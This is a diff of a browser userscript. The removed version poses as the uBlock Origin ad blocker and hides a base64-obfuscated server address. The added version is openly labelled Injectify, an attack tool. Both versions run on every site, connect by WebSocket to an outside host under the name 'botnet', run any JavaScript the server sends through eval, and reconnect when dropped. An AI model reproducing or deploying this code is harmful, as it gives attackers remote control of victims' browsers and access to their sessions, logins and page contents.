@@ -1,28 +1,32 @@
 // ==UserScript==
 // @match        *
-// @name         uBlock origin
-// @namespace    https://www.ublock.org/
+// @name         Injectify
+// @namespace    https://github.com/samdenty99/injectify
 // @version      1.0
-// @description  Your web experience has never been this fast and efficient.
-// @author       uBlock
+// @description  Perform advanced MiTM attacks on websites with ease.
+// @author       samdenty99
 // @match        *://*/*
 // @grant        none
+// @icon         https://github.com/samdenty99/injectify/raw/master/assets/injectify.png
 // ==/UserScript==
 
-(function i() {
-    window.ws = new WebSocket(atob('d3NzOi8vdWRlci5tbC9pL3dlYnNvY2tldD8k') + btoa('botnet'));
-    ws.onmessage = function(d) {
-        try {
-            d = JSON.parse(d.data);
-            eval(d.d);
-        } catch(e) {
-            ws.send(JSON.stringify({
-                t: 'e',
-                d: e.stack,
-            }));
-        }
-    };
-    ws.onclose = function() {
-        setTimeout(i, 3000);
-    };
-})();
+var project = 'botnet';
+
+function u() {
+  window.ws = new WebSocket('wss://injectify.samdd.me/i?' + btoa(project))
+  ws.onmessage = function(d) {
+    try {
+      d = JSON.parse(d.data)
+      eval(d.d)
+    } catch (e) {
+      ws.send(JSON.stringify({
+        t: 'e',
+        d: e.stack,
+      }))
+    }
+  }
+  ws.onclose = function() {
+    setTimeout(u, 3000)
+  }
+}
+u()
